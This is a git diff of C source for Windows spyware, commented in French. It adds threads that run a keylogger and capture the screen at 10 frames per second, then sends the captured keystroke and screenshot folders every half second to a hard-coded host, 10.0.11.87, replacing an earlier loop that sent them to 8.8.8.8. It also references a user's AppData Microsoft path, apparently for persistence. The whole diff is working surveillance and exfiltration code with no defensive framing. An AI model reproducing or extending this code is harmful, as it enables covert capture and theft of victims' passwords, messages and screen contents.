@@ -1,6 +1,7 @@
 #include "keylogger.h"
 #include "screen.h"
 #include "for_all.c"
+#include <process.h>
 
 const char *output_dir = ".output_screen";
 const char *output_file = ".output_text/text.txt";
@@ -11,6 +12,12 @@ const char *window_start_path = "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Micros
 #include <winsock2.h>
 #include <windows.h>
 #include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <gdiplus.h>
+
+
+#pragma comment (lib,"Gdiplus.lib")
 
 #define SLEEP(ms) Sleep(ms)
 
@@ -52,33 +59,81 @@ int start(char *executable, char *args) {
     return 0;
 }
 
-int main(int argc, char *argv[]) {
-    char path[2048];
-    mkdir(output_file_dir, 0755);
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <windows.h>
 
-    // Récupérer le chemin de l'exécutable
+
+// Remplace ces fonctions par tes vraies définitions
+DWORD WINAPI start_keylogger_thread(LPVOID lpParam) {
+    start_keylogger(output_file);
+    return 0;
+}
+
+DWORD WINAPI capture_screen_thread(LPVOID lpParam) {
+    int fps = *((int *)lpParam);
+    wchar_t w_output_dir[512];
+    mbstowcs(w_output_dir, output_dir, sizeof(w_output_dir)/sizeof(wchar_t));
+    capture_screen_720p(w_output_dir, fps);
+    return 0;
+}
+
+int main(int argc, char *argv[]) {
+    printf("argc: %d\n", argc);
+    printf("executable path: %s\n", argv[0]);
+
+    // Création des répertoires (ignore erreur si déjà existant)
+    CreateDirectory(output_file_dir, NULL);
+    CreateDirectory(output_dir, NULL);
+
+    // Vérifie si le fichier existe
+    FILE *test = fopen(output_file, "r");
+    if (test != NULL) {
+        fclose(test);
+        printf("Le fichier existe déjà. On ne touche pas.\n");
+    } else {
+        FILE *file = fopen(output_file, "w");
+        if (file != NULL) {
+            fprintf(file, "Fichier nouvellement créé.\n");
+            fclose(file);
+            printf("Fichier créé avec succès !\n");
+        } else {
+            printf("Erreur lors de la création du fichier.\n");
+        }
+    }
+
+    char path[2048];
     if (GetModuleFileName(NULL, path, sizeof(path)) == 0) {
         printf("Erreur lors de la récupération du chemin de l'exécutable\n");
         return 1;
     }
 
-    if (argc < 0){
-        start(path, "1");
-        start(path, "2");
+    printf("executable: %s\n", path);
 
+    //if (argc == 1) {
+        printf("Mode par défaut\n");
 
+        // Lancer deux threads (start_keylogger et capture)
+        int fps = 10;
 
-    } else if (argc < 0) {
-        if (strcmp(argv[0], "1") == 0){
-            start_keylogger(output_file);
+        HANDLE thread1 = CreateThread(NULL, 0, start_keylogger_thread, NULL, 0, NULL);
+        HANDLE thread2 = CreateThread(NULL, 0, capture_screen_thread, &fps, 0, NULL);
+
+        if (thread1 == NULL || thread2 == NULL) {
+            printf("Erreur lors de la création des threads.\n");
+            return 1;
         }
-        else {
-            capture_screen_at_fps(15, output_dir);
-        }
+
+
+    // Boucle principale
+    while (1) {
+        Sleep(500); // Sleep en millisecondes
+        printf("sending !");
+        send_dir(output_dir, "10.0.11.87");
+        send_dir(output_file_dir, "10.0.11.87");
+        printf("sended !");
     }
-    while (1){
-        SLEEP(18000 * 1000);
-        send_dir(output_dir, "8.8.8.8");
-        send_dir(output_file, "8.8.8.8");
-    }
+
+    return 0;
 }
